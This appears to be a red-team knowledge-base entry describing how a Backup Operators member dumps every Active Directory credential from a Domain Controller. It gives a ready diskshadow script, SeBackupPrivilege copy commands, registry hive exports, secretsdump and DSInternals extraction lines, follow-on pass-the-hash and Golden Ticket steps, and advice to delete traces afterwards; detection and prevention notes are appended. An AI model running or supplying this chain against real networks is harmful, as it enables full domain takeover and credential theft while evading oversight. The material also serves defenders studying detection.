Also grab SYSTEM and SAM hives

notes:
=== Backup Operators — NTDS.dit Full Domain Hash Extraction ===
Extract all domain credentials via NTDS.dit using VSS snapshot + SeBackupPrivilege.

=== WHY VSS IS NEEDED ===
NTDS.dit is locked by AD DS service while DC is running — cannot open directly.
Volume Shadow Copy creates a point-in-time snapshot where NTDS.dit is not locked.
SeBackupPrivilege then allows copying from the shadow copy (bypassing ACL).

=== FULL ATTACK CHAIN ===
Step 1: Create VSS snapshot with diskshadow script
  Create script.txt (must include all these settings):
    set verbose on
    set metadata C:\Windows\Temp\meta.cab
    set context clientaccessible
    set context persistent
    begin backup
    add volume C: alias cdrive
    create
    expose %cdrive% E:
    end backup
  Run: diskshadow.exe /s script.txt
  clientaccessible = accessible to non-SYSTEM users (required)
  persistent = survives reboots

Step 2: Copy NTDS.dit from shadow copy
  Import SeBackupPrivilege DLLs + Set-SeBackupPrivilege
  Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit .\ntds.dit

Step 3: Export registry hives (Boot Key needed to decrypt NTDS.dit)
  reg save HKLM\SYSTEM .\SYSTEM
  reg save HKLM\SECURITY .\SECURITY

Step 4: Offline credential extraction
  python3 secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
  → All domain account hashes in NTLM format

=== ALTERNATIVE TOOL: DSInternals ===
$key = Get-BootKey -SystemHivePath .\SYSTEM
Get-ADDBAccount -DBPath .\ntds.dit -BootKey $key -All | Format-Custom -View Summary

=== CHAINING CONTEXT ===
NTDS.dit dump → Administrator hash → pass-the-hash everywhere in domain
NTDS.dit dump → krbtgt hash → Golden Ticket (unlimited domain persistence, 10-year default TTL)
Domain user hashes → offline cracking → plaintext passwords → password spray
NTDS.dit gives Kerberos keys too → overpass-the-hash / pass-the-ticket

=== WHAT TO LOOK FOR ===
Backup Operators on DC + local logon rights = game over for domain
diskshadow clientaccessible setting is critical — without it, shadow copy requires SYSTEM
Any account with both local DC logon + SeBackupPrivilege = same result regardless of group

recommended.note: The SeBackup primitive this builds on.

name: Backup Operators - Dump NTDS.dit via diskshadow
command: diskshadow.exe   # script a shadow copy, then Copy-FileSeBackupPrivilege the ntds.dit
description: On a Domain Controller, use diskshadow to create a shadow copy of C:, copy NTDS.dit off it with SeBackupPrivilege, back up SAM/SYSTEM hives, then extract all domain hashes offline with secretsdump.

defense.why_it_works: NTDS.dit is locked by the AD DS service and cannot be copied directly. Diskshadow creates a Volume Shadow Copy (VSS) of the C drive and exposes it under a new drive letter, providing access to a snapshot of NTDS.dit that is not locked. SeBackupPrivilege then allows copying this snapshot file. The extracted NTDS.dit combined with the SYSTEM hive enables offline extraction of all domain account hashes.
defense.prerequisites: Membership in Backup Operators (SeBackupPrivilege + local DC logon rights). Diskshadow.exe available. SeBackupPrivilege library loaded. SeBackupPrivilege enabled in token.
defense.impact: Complete extraction of all domain account NTLM hashes, Kerberos keys, and password history from NTDS.dit. Enables full domain compromise via pass-the-hash or offline password cracking.
defense.detection: Diskshadow execution creating VSS snapshot. Large file copy from VSS exposed volume to staging directory. reg save of SYSTEM hive by Backup Operators member. secretsdump.py processing extracted files. Event ID 8222 (shadow copy created), 7036 (Volume Shadow Copy service state change).
defense.artifacts: Event 8222: Volume Shadow Copy created by Backup Operators member | Staging: ntds.dit + SYSTEM.SAV files | Network: file transfer of multi-GB NTDS.dit | secretsdump output with all domain hashes
defense.prevention: Apply the same controls as sebackup-copy-file. Enforce privileged access workstations (PAWs) for Backup Operators. Monitor VSS activity — shadow copy creation by non-admin is anomalous. Consider Microsoft ATA/Defender for Identity detection of DCSync-like hash extraction.
defense.misconfiguration: Backup Operators membership without Tier 0 privileged access controls. No monitoring on VSS creation events. NTDS.dit directory not monitored for unusual access.
defense.vulnerable_config:
# VSS shadow copy attack:
diskshadow.exe  # interactive: expose C: as E:
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
reg save HKLM\SYSTEM SYSTEM.SAV
# Offline:
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
defense.secure_config:
# Tiered access model for Backup Operators
# Use dedicated PAW for backup operations
# Back up via Windows Server Backup with dedicated service account
# not via interactive Backup Operators logon to DC

# Monitor VSS creation:
Get-WinEvent -LogName System | Where-Object {$_.Id -eq 8222}

# Alert on NTDS.dit access by non-SYSTEM processes
defense.evasion: Copy the hives/ntds via the shadow copy, parse OFFLINE, and remove the shadow copy + copied files after.
